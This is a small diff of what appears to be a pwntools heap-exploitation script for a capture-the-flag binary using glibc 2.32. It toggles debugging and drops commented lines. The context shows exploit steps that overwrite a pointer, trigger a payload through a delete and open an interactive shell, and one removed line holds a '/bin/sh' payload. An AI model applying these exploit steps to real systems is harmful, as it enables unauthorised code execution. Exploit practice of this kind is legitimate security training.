@@ -3,7 +3,7 @@ import time
 
 context.log_level = 'debug'
 context.arch = 'amd64'
-debug = False
+debug = True
 
 elf = ELF("./vuln")
 libc = ELF("./2.32-0ubuntu3.2_amd64/libc.so.6")
@@ -136,8 +136,7 @@ add(6, 0x550, b"abc")
 add(7, 0x550, b"abc")
 edit(7, p64(getkeyserv_handle))
 
-#ddebug()
 edit(6, payload)
-#edit(6, b'/bin/sh\x00')
 delete(6)
+
 io.interactive()
